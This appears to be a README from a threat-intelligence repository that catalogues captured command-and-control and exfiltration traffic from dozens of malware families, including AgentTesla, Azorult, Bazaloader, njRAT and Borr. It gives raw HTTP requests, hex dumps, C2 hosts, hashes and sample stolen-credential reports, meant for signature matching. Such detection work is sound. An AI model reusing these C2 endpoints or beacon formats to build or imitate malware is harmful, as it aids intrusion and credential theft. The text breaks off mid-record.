### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)

#### ACBackdoor
Hash: 907e1dfde652b17338d307b6a13a5af7a8f6ced93a7a71f7f65d40123b93f2b8

Pcap: (https://github.com/silence-is-best/c2db/blob/master/pcaps/acbackdoor.pcap) and sslkeyfile: (https://github.com/silence-is-best/c2db/blob/master/pcaps/acbackdoor.txt) 
~~~
POST / HTTP/1.1
Host: 193.29.15.147
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
Accept: */*
Access-Control: aW5mbw==
X-Access: c22ed12456e9eb9844eafe80f3d8c080
Content-Length: 48
Content-Type: application/x-www-form-urlencoded

NTI6NTQ6MDA6NEE6QUQ6MjEKV2luZG93cwp4ODZfNjQKMC41

HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
Date: Mon, 11 Nov 2019 13:55:27 GMT
Content-Length: 0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/acbackdoor.png "ACBackdoor")

#### AgentTesla
ftp:
~~~
<html>Time: 11/25/2019 17:48:57<br>User Name: admin<br>Computer Name: USER-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 4095.61 MB<br><hr>URL:https://www.facebook.com/<br>
Username:honey@pot.com<br>
Password:honeypass356<br>
Application:Chrome<br>
<hr>
URL:192.168.1.1<br>
Username:honey@pot.com<br>
Password:honeypass356<br>
Application:Outlook<br>
<hr>
</html>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agentteslaftp.png "AgentTesla FTP")

http:
~~~
POST /zin/WebPanel/api.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Host: megaplast.co.rs
Content-Length: 308
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")

smtp exil:
~~~
From: office@larbaxpo[.]com
To: officelogs@larbaxpo[.]com
Date: 9 Oct 2019 17:58:19 +0100
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7

----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
5.183.107.236=0A<hr>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")

#### Amadey
~~~
POST /madapam/index.php HTTP/1.1
Host: bolsaooma.com
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

id=6289217249&sd=MMMMMM&vs=1.43&ar=0&bi=0&lv=0&os=9&av=0&pc=USER-PC&un=admin&

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 09 Oct 2019 06:20:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 6
Connection: close

<c><d>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")

#### Arechclient2
~~~
....+.{"Type":"EncryptionStatus","Status":"Off"}....&.{"Type":"ConnectionType","ConnectionType":"Client","SessionID":"191003337","BotName":"admin","BotOS":"Microsoft Windows 7 Professional "}....-.{"Type":"SessionID","SessionID":"191003337"}......{"Type":"AfkSystem"}....).{"Type":"ServerAfkSystem","Status":"ok"}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/arechclient2.png "Arechclient2")

#### Artraloader
~~~
POST /kvs06v.php HTTP/1.0
Host: onlinejohnline99.org
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-length: 97

SNI=VTFS.QD&UME=Xjoepxt!8!Qspgfttjpobm&OPQ=benjo&IVR=VTFS.QD$$benjoAA11482.572.3314613.96675&st=0

HTTP/1.0 200 OK
Content-Type: text/html
Content-Length: 0
Date: Mon, 26 Aug 2019 21:33:28 GMT
Server: LiteSpeed
Connection: close

POST /Engset.php HTTP/1.0
Host: hewle.kielsoservice.net
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-length: 126

BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$benjoAAcc:37f65.f4db.51ge.bf:1.3875452f88:3&st=0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/artra.png "Artraloader")

#### Avemaria, aka ave_maria, warzone rat
~~~
    00000000  09 12 3b 42 2d 33 a2 44  fc 01 86 73               ..;B-3.D ...s
00000000  09 12 3b 42 f7 33 a2 44  fd 01 86 73 69 3d ae 12   ..;B.3.D ...si=..
00000010  bb c6 19 fd 1a 3a f3 11  c9 ae da 3c 30 bc 38 81   .....:.. ...<0.8.
00000020  fc 00 0f ca 4e fb 05 c6  de b7 3c 6f 4e 01 a2 87   ....N... ..<oN...
00000030  82 f5 2f 8e ed 2a 1f 0e  b7 43 0c a0 34 5d bd 80   ../..*.. .C..4]..
00000040  50 56 66 1a 11 af f5 c8  a3 16 b0 d4 38 12 fe 66   PVf..... ....8..f
00000050  6b 84 c4 4b 58 f4 d3 ce  87 45 75 54 60 f0 d5 3e   k..KX... .EuT`..>
00000060  f1 79 73 5d 9f 1c c4 8e  1a c5 16 20 71 5e 55 06   .ys].... ... q^U.
00000070  21 7b 8d 35 de 00 25 5d  6f d7 f2 ca a3 ea ef 73   !{.5..%] o......s
00000080  90 1f 6e 10 d3 b1 0a 56  17 71 3b 48 bd 5c d9 36   ..n....V .q;H.\.6
00000090  7e b4 f1 76 46 b8 48 ca  45 1e cd 66 90 d5 67 6b   ~..vF.H. E..f..gk
000000A0  aa b7 98 ed 9d df 7e 36  c0 78 87 6b 56 03 86 67   ......~6 .x.kV..g
000000B0  1f ed bb 9e e6 78 aa d5  94 e3 0e e2 c0 5e c7 87   .....x.. .....^..
000000C0  57 60 34 e4 06 ea 10 ae  6e 38 c3 ca af 01 e2 2c   W`4..... n8.....,
000000D0  ea d4 26 f9 3a 05 83 f7  aa 59 db 01 f5 2b 40 1e   ..&.:... .Y...+@.
000000E0  74 28 36 1f ac 03                                  t(6...
    0000000C  09 12 3b 42 2d 33 a2 44  dc 01 86 73               ..;B-3.D ...s
000000E6  09 12 3b 42 29 33 a2 44  eb 01 86 73 bc 8d c4 e7   ..;B)3.D ...s....
    00000018  09 12 3b 42 5d d9 a2 44  e2 01 86 73 bc 8d c4 e7   ..;B]..D ...s....
    00000028  ca 69 41 01 ab 12 30 ff  ae 64 2d 93 dc 65 53 9b   .iA...0. .d-..eS.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria.png "Avemaria")
~~~
con|1597172877123|285|ZTkyNGVhNzkxMjU1N2RlZHxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW8gICAgIFQ3NzAwICwgU3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXJ8V2luIDcgICh4NjQpfFRXVm5ZVVIxYlhCbGNpQXhMakFnWW5rZ1EyOWtaVU55WVdOclpYSWdMeUJUYmtRPXwwZCAwaCAwbSAwc3w3NjZ8LXwwfDQgR2lCfE4vQXwyMzA0fDE5Mi4xNjguMTAwLjEwMXwxfC0xfERlZmF1bHQ=@
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria2.png "Avemaria")
~~~
    00000000  17 69 89 31 17 60 ba b0  02 23 a9 79               .i.1.`.. .#.y
00000000  17 69 89 31 ab 60 ba b0  03 23 a9 79 ba 5d bb 30   .i.1.`.. .#.y.].0
00000010  0f 57 5c a6 38 ca da 21  2a 61 66 45 19 f7 7f c6   .W\.8..! *afE....
00000020  58 09 d3 89 cd 36 fe 88  43 f9 a3 33 40 f7 84 1c   X....6.. C..3@...
00000030  19 47 dd 80 1c f2 e0 a4  8b af b9 f1 f7 25 53 48   .G...... .....%SH
00000040  69 a0 32 da c8 1d 3e 07  38 44 3d 5d d6 e8 79 c8   i.2...>. 8D=]..y.
00000050  aa ff bc d4 11 48 8d 9b  b2 6a 8e 7b 9a 9c b7 da   .....H.. .j.{....
00000060  b5 fb d6 74 f1 e3 48 88  db 08 bf bf dd d8 a3 3a   ...t..H. .......:
00000070  11 c0 4c 98 8d 0e f7 4f  2a 1d 19 12 25 dd ff 72   ..L....O *...%..r
00000080  69 6e 43 c3 db 76 a1 05  2b 6b ef b6 29 8d 52 88   inC..v.. +k..).R.
00000090  db 6e 9b 5b 77 e0 34 57  33 79 7b 95 72 60 65 cb   .n.[w.4W 3y{.r`e.
000000A0  f7 38 3c f0 12 82 d6 1c  71 12 f7 26 e3 1a b9 49   .8<..... q..&...I
000000B0  c8 eb 46 0f 54 cb f0 35  9c 3e 4d 08 7b 9f 4b 72   ..F.T..5 .>M.{.Kr
000000C0  d5 c3 27 da 27 51 47 de                            ..'.'QG. 
    0000000C  17 69 89 31 17 60 ba b0  2a 23 a9 79               .i.1.`.. *#.y
    00000018  17 69 89 31 5f 60 ba b0  20 23 a9 79 79 fa d3 d9   .i.1_`..  #.yy...
    00000028  1d 44 2c 26 8a c9 f5 58  76 a2 3e f6 1c 79 65 06   .D,&...X v.>..ye.
    00000038  23 08 a7 89 d7 34 8c 88  36 f9 ca 33 35 f7 aa 1c   #....4.. 6..35...
    00000048  72 47 b9 80 3f f2 c1 a4  e7 af 97 f1 db 25 31 48   rG..?... .....%1H
    00000058  4a a0 14 da ab 1d 4e 07  57 44 7e 5d 42 a2 a0 0b   J.....N. WD~]B...
    00000068  2d f8 d9 d4                                        -...
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria3.png "Avemaria")

#### Azorult
POST retrieve method, unique pattern with lot's of '/' and ')'
~~~
POST /index.php HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
Host: 51.38.76.57
Content-Length: 103
Cache-Control: no-cache

J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")

#### Backstage aka Powerkatz
Hash: b4e270dce231fd01c326f0828a3c5ad80012ebb932842aa8e420575859406fac

Pcap: (https://github.com/silence-is-best/c2db/blob/master/pcaps/backstage.pcap)
~~~
POST /index.php/api/fb HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Length: 933
Host: www.wdsfw34erf93.com

data=aHpyTUxwSW1cNTw0ZXFVTV1GTDlMRkxsT0RyTUxwSXZlSUVraFo0b2VxVVFdW1VyZTVVfUxtcmpMbEx2RmpubFw1PHlkNW9vVnFReWVsTDlMRk1lW0o4Z0xJe3hMbHpORlZNcFxxWX1dW016XFtRfUxtcmpMbEx2RmpubF1xTXNdWjhuZjM4NGVWTDlMRkx6TGx6TkZWTXBmcDx3TG1yakxwWTddVkx2RmpubGRKSX1WSjx3XVlFa101WGxSbERsUEZMdkZqbmxkWjh9XDU8eWQ1b29WcVF5ZWxMOUxGTWVbSjhnTEl7eExsek5GVk1zZXFRNGY1WXxmSkl9ZnxMOUxGTGxPRHJNTHBvfVRwM2xSbERsTGx6TkZWTXNmM1FyZnA8d11YWTdkW1EzTG1yakxtSGxPRHJNTHBvfVdKPHFkWjhvXUZMOUxGTHpMbHpORlZNc2Y1b3hmNlVrZUp6bFJsRGxQRkx2RmpubGU1TXRYNm99Vlo4cGV8TDlMS3ZORlRubF1wb3xmNlVMXUpVV11bTXNcWntSZ1o0bF1bTGxSbERsUUpUNFBXUHpQfUR9UEdQelBtRH1QV0x6UG1EfFBHTHpQbUR8UEdMelBtRHxQR0x6UG1EfFBGTHZGam5NTHA0a1w2UGxSbEVlRmpuTUZWTDRQbXI0UUdyelBHcntQfXI3UX1yelFWTGpGam5NW1Z6TkZUbmxmNm99Z0pZd1lwWXxmNW95ZWxMOUxGTVtkWjhuZTZnfVE0UVRQWDx8VTZNb1xbVW9mbEVHZUpvb2VxVGxMRHJNaVZ6TkZWTXpcW29NZXBdeUxtcmpMbEx2RmpubGZwSXhdRkw5TEZMe1F9ajdRfEx2RmpubGdab25MbXJqTG1MelFsTHZGam5sZ3BZfGY1b3llbEw5TEZMNUxsRE5pVkRO

HTTP/1.1 200 OK
Date: Wed, 23 Sep 2020 12:30:29 GMT
Server: Apache
Upgrade: h2
Connection: Upgrade, close
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

aHxNfWdKSTNnW1BsUm1JPA==
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/backstage.png "Backstage")

#### Bandook RAT
~~~
00000000  64 4f 7a 54 30 46 72 56  44 51 4c 30 6f 32 49 48   dOzT0FrV DQL0o2IH
00000010  6f 70 46 6c 31 69 37 48  4c 35 48 48 54 4f 6e 66   opFl1i7H L5HHTOnf
00000020  6f 30 55 72 6a 47 7a 48  30 61 30 4f 62 54 37 69   o0UrjGzH 0a0ObT7i
00000030  45 42 64 2b 54 4e 6a 4f  72 77 74 44 6d 4c 57 52   EBd+TNjO rwtDmLWR
00000040  59 54 68 6f 36 6b 4c 2f  42 38 33 43 4d 75 49 2b   YTho6kL/ B83CMuI+
00000050  6e 34 46 5a 55 66 49 4a  2f 70 6e 31 32 6a 62 73   n4FZUfIJ /pn12jbs
00000060  4c 2f 4c 79 54 73 42 73  76 63 48 66 6e 6b 4a 53   L/LyTsBs vcHfnkJS
00000070  5a 6a 6b 4b 59 34 2b 54  4b 48 44 76 6c 54 32 52   ZjkKY4+T KHDvlT2R
00000080  59 57 69 59 4a 70 54 48  6d 70 68 4f 70 51 4d 47   YWiYJpTH mphOpQMG
00000090  6d 77 3d 3d 26 26 26                               mw==&&&
    00000000  64 4f 7a 54 30 46 6f 3d                            dOzT0Fo= 
00000097  64 4f 7a 54 30 46 76 56  44 51 3d 3d 26 26 26      dOzT0FvV DQ==&&&
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bandook.png "Bandook")

#### Bazaloader/Bazabackdoor
~~~
GET /pool/job/priority/normal HTTP/1.1
Cookie: HSID=u4EATrsU%2BccZ%2F317LbjgmA6QPLukoI06IX0jiIvsbHOtjThVcMc92Dn08M2eDuWDH3MXcwNO6x4HFg0uhoT3p5tzHh28ab1XyEHdCk4GpfRVj4fFDrtCYi0Z7sk59slweik4TdcpZ4MQqVDfR7i8JaXDN3lfmAVyp9wV34FGGWkgTSFVeGGwKIGhd%2BLkkCWtoMEDoB1YCQHNbEGIlQRAcdKu1uPCDJzOnFivkkiS71IUUX2LacOB1rJ4404HcKP8NmivQ10vy9KBA6uURsQt77zwUX5aicItO3YXJ6HD67TIVa5jhVBlYi1YMJ35SVCbxrFOudvjK23gUjwPFswweQ%3D%3D;SIDCC=t1vgfZ5T9hmjM2bXEHqETxQJ%2FD6%2FO8Ni273vVwk0WctwmufD6uy%2FovmzIi349CWnTEkov0mEC8GyV5nN4fVxwHY1uHsACM5Kc4tfTzwuwN1%2F0h5aMXEBX1whQXEkw4YqIYuRI8KVICQyLmDi%2BjFQoZwzvRbyJpaoHrCalnA1ezNYvJwlt3XbytQL%2BJOR3%2FJ%2FzCfBIxzBTN7%2BwE04D03ROPBs3B8IE53QrE5%2BMQP8Jv6kI74o8%2BsJS5W29bMn01WV49OAdfMlzMKZquOoBC4zvSuaZU5tpNkPwPJJLeUaXEnuAyNSxj7uDJNdM0jkIb%2FhokOijY77%2FRe2YjrfjaofeQ%3D%3D;SID=uSFINuTAOqFt2EPgZrdxIDpmVT0LFTCzEnYCzNVuvjeHwTBqJoL7hyueBhvQPeiMI6Nmu4bXbTrdBfx6xK49K%2BmDMRaftQ%2BPJXDoiVMrab3IPnD9SEffK9OONpXj8FfDX%2FRFrzgLPd0XtGuT9L0jMQSoV4ztrGpcqZ54K1E4Sg28YfuvG31rUZvgtlktnMEh%2FvxkOrPX3z%2Fx1EwTmXLaumiweiKkhAT4ZBrqgG5bf%2FGP%2Bof9hoY8te34a4Zfs9gJxzq0ZqO9KRQf66al%2BGKGIPzcR2hIhPjG1JfqTAYb5OYxVSgMCDViAV3lSuR0vou0KAvsbk650gwGQPLSJWJHVw%3D%3D;SSID=39cuio0XzqpWy0DLG4NZ9X1ZMTAf29t378zdWUbCKP81IPRp4HMFojBN6OZn%2B1sSaPpNWiCiX6GUC5dwNwGhOIs1RUN0eLQYmLADWX290GSSm62UmtD5WrV85WV5iOLJEsXiYIbNdYKQ%2BHpZHDzSfY5%2BzCsghZYIi3FCR96tUt9gJxGB4jEMSUzhtNDCEQyvx4H906IG2s7dmA8WbJA%2B0nZ9rCH6u5%2FpQfwM9DFxiELNl4wvEGGz1L%2BBtRrYKkPfULuPKjACSkdo86GJuCbgxVDVBlboB3F7fyvJt2OwwMeK77hYqhgryk3K%2BJnRQgDntdgR4H8MMSBgI9vVnaFvYA%3D%3D;
X-Tag: gz7XdHGoT%2FJKHRjpIamqqoB1AGoy3qdIedXMY5OWHeizgooQ%2BXMI1BHsqRgAobELwQbdqjEONQBZSbXe2hni0t4YDbKmvjrX3%2BRBiPD3u6kO6UWdSRmXR17Ixb6yU3qT3LoJBGcU%2FQA9pwudVzaAVyQA3BkziY6qLdqeo4ZFaNBYTubbPZZhiOELF6UdCa22VYyzIYBSC0pxN8l4itAKsrQL%2FVjxKAXj1SDOyK4DLFgNae%2Fqs0MvckMO2xUEVucj8cI2UMRTJ73ZFJ05REyx%2ByOX83q6qu%2FrV4DM1IxuQDw8h4CMb56EZgY4yeDIrumVGz7LqX1jxb38KADWnBUbfw%3D%3D
X-Csrf-Token: rykCu%2BVHJ2bEINA3xxHcfV2w7cRN6ZUaQJWyTdqK0CUQU0rXSZNMUG7Z5ve5o14t0lrePa4eYZVcAtpMlDJpIOMCa3Lk2qaleYNHaQM8%2F41wtLEo5SozmFoUeqRi9f%2BXnWxYr3vzdx3XpRGqkCWXTKuyIE%2BSwDyX7yvuxXjHWaf4qak%2FQ6Uz4NMcDnMwFiKwxLkIk2X%2FK16znremUZ0qP0HaoWjl3%2F5k7zVDBWuU%2FZahGvms4QQxkpAdKT5yFQT9OYz8M52hGRAAWR%2FEDy8hqLK2b2po3YfP3YF%2FM2yNi4uLq%2FP%2BDKEA9i0nEKKe%2BrLf%2BpUjpZ%2Fl5jbeolIOH0bZNg%3D%3D
X-Request-ID: k54ZVOB5jq2e2LHM6gvpHzLleRRD68OXJsJFZLG4cOG5hjWDtf2BIk%2BKrd2RlZDnrcYBjLAGGchBQl9G4CNZFDi4dizDjbTHTo6acwxaJHSuq54M6aL4YpIzkziT4F%2FSAcrnqoxwF5Vy%2BBurRUzVpIIArTbpcN7WSO%2BANlBUayw7nW6MUZ0PtCHQXxlTgt5qGcBqn9IlsFeQtwyRa1TgA2FXTYVWJHm923yDurCV0CmkI0qTI2GujJWG5OcAZqqhwGHmCmxZDMONv248RGjGSHeDibSGbGDxah6rRqKqg4vx9YDFR92dx7iEyWeQhSMkHQnc0JV%2FC0thtgmkjj68Sg%3D%3D
Host: 195.123.211.5

HTTP/1.1 200 OK
Server: nginx/1.10.3
Content-Type: application/json; charset=UTF-8
Content-Length: 2
Connection: keep-alive
Date: Thu, 24 Jun 2021 19:26:18 GMT
Set-Cookie: DV=5ssdw9_D40TpEC3m
Set-Cookie: fr=312725
Set-Cookie: NID=Ca2zDxRCiyvVM6sKhctvLJ2Vrys8Ld2uuXrfUhxg5JW00EZxGAyJooDyiky8504Oh_hZSHzfzOYLt_JEjY0VvGN-jnKRWLL-EZxdCPhDH937LrOkqwduARCJFTf4Onb49DNYiV5EYKD2cXAOhZl8hukrtGjHqtPrQD6en3BFOpws4X4pFBXz53RPD8lmRLcmLXWws3qrKoyJo8A_eFuUABvqvA7eJTJZ7dZO3NIRC1oZixRhdNytbVzI1PFJOQBY
Set-Cookie: datr=b4n4l%2BdMcUiAk3BgfGSx3CvY5IBMiR%2Fz0LdmGzvzAULKDgDHLpUbf6eH8AAwBG5q5IjuegyO0LPkEZRCqmiPKM9OvVT9eBEiG7RX9Yn%2FN1v43Km09B9fvjxOau6QEfOUzPjazm%2FdRhkTTEA4Q28oe8neeqRwVpH7PTRp0%2BzWPNxjv1uNhfPls1Iq%2B97zGmNxeKcGvE3mFaQPuuMif%2FzN5Hltrm56QnnfyEJ6PDvC8FdJS%2B4Tdasn3VpV1CXKXYvcFvb5kVkQnuqvXF3a6hlx1BZXQQsK8Ls3p6Q0lZO1VgnstYpKccmW7QEekMs5USUUyE2ZDZOyunRod%2Bmci5ePzQ%3D%3D
Set-Cookie: SID=433278
Set-Cookie: HSID=750848
Set-Cookie: SNID=FwxJ05MkOfvPjHLjx6_ECANXTqnfF4KazSvYfbsQxuDqwnRw3sQ6-ziG9cSOdz4PyizA1Q6eTWM7xRHA3NOE7Lcl8F7ulbBRjRdUtZc5WDn0_DSHjyYIReH0O0bJOtVgLaRhNa6lrQqJPl36FUfacLEbEQ5qX7X8tXf4t216rGOxVdPI075mn6YSPT_boPA2CMcGphwO6Voz1telbeiu__Y7weWCii9xW_YtYdCK5P8PNMhN7fZvvkmTKcP0e-aw
Set-Cookie: CGIC=cdXhUoYzwvog7mCeJBtGk9ntKIXXtJNmxhbrvLXvvKW2T_v7LPVGISh_UA
Set-Cookie: SSID=false
Set-Cookie: stamp=192153
Vary: Accept

OK
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/baza.png "Bazaloader")

#### Betabot
~~~
POST /forum3/logout.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: russk9.icu
Content-Length: 664
Cache-Control: no-cache

bcjkr=386731&dgpsben=2019162b8cf358952f71fa238d6ecbcd6c424d692427445f&fkvalqbgr=C27431FCDE2C51BA6EA493FEAB76CE9BE2812C592CBADEEC4495BC94DDE1882E969102B5A9939B43816D8DA17AC2C05A575A4FC03B11D0C9614BE38ABB6B7F57984A1EC6D101BF290C06DC4C3093B6B165ACAEF8C9EFE3099C11D2106C16EFFD27888EB24A03E0CDE4935AAB53FD212683FF45CAE1BF47F2C343D602E10C79E49B74E6FE10469501A63C762A089446AC9A1C5A802C80071E11058065B5C481D0DB2E6B0AC9A7461DE3DA4792CC86A6E072080ACCB527BB0D97D7C91874B8754068C71AD56502B1A03279A280EF9E705E25193C82A93B220B4B1A63FD8B93EF2B528AF5EB5A00E4234CF1744FA96A05937E7B41D4B82B3997203F0ABCBFC2C49245E56DED2DF1941DA739C6F9C7C3E30C93A136705F3574F34C74E6DE2AD09C9BFA616F4C

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Mon, 28 Oct 2019 23:47:58 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.5.38

..._...+...<.f........}..........?...yg.4.....#.Q...p...1yy.u..N?.ueg.v....EO......K.:....R.]......zv...3@j..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/betabot.png "Betabot")

#### BitRAT
Hash: 9e11c859c27b3696188e8b9ad95513dcc0a61980232dc4bf455df5d6f4454e46
~~~
con|1601670957699|281|MTE0NGRlZjhiNzc4ODM5ZXxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW8gICAgIFQ3NzAwICwgU3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXJ8V2luIDcgICh4NjQpfFFXUnRhVzVwYzNSeVlYUnZjam9nUTI5dGJXRnVaQ0JRY205dGNIUT18MGQgMGggMG0gMHN8MTEwfC18MHw0IEdpQnxOL0F8MjUxNnwxOTIuMTY4LjEwMC4xMDF8MXwtMXxEZWZhdWx0fDEuMzA=@
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitrat.png "Betabot")

#### Bitter RAT (Patchwork)
~~~
GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
Host: frameworksupport.net
Connection: close

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Date: Sat, 12 Jan 2019 02:44:27 GMT
Accept-Ranges: bytes
Server: LiteSpeed
Connection: close

90059c37-1320-41a4-b58d-2b75a9850d2f 78.109.23.2 User-PC EXE: ##
SIZE: ##

AXE: ##
SIZE: #45#SRE: ##
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitter.png "Bitter RAT")

#### Bladabindi aka nJrat
~~~
147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")

#### Blacknet
~~~
GET /black/BlackNETPanel/receive.php?command=UGluZw==&vicID=SGFjS2VkX0M0QkEzNjQ3 HTTP/1.1
Host: meublesinde.in

HTTP/1.1 200 OK
Date: Fri, 17 Jan 2020 19:49:47 GMT
Server: Apache
X-Powered-By: PHP/7.1.33
Upgrade: h2,h2c
Connection: Upgrade, close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blacknet.png "Blacknet")

#### Blackrat aka blackremote
~~~
9.............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes.............102622021F20414A5644044411072A755821285E472B1826013113651A28101927225D5B1037185F69394B2911291A1A3F031C113F696C1442754978280A031673281879480C2843582C0B032E41737D7E5B5C7A0F7C0D7521
...............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes..........."1A3A0F03142D5055131F585605383F4051

...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes...........(102622021F20415F0818765B27312642512C3103
...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes............123C3803363F73570B0552
..$............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")

#### Borr
~~~
HTTP/1.1 100 Continue

POST /Auth/index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 92.63.197.188
Content-Length: 203
Expect: 100-continue
Connection: Keep-Alive

type=login&username=n3L9rdjJe47G%2bCRzL%2fTwmQ%3d%3d&password=n3L9rdjJe47G%2bCRzL%2fTwmQ%3d%3d&hwid=lsd&session_id=ejQ5U3JwREpZV0k4d21DTU85WHdlTXVTN2lEQ2hkMzI%3d&session_salt=ejQ5U3JwREpZV0k4d21DTQ%3d%3d

HTTP/1.1 200 OK
Date: Thu, 30 Jan 2020 01:53:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 24
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

ZZRTKdEbowHH5njhG6UW5w==

GET /gate.php HTTP/1.1
Host: 5.188.60.21
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Thu, 30 Jan 2020 01:53:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 56
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exeHTTP/1.1 200 OK
Date: Thu, 30 Jan 2020 01:53:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 56
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

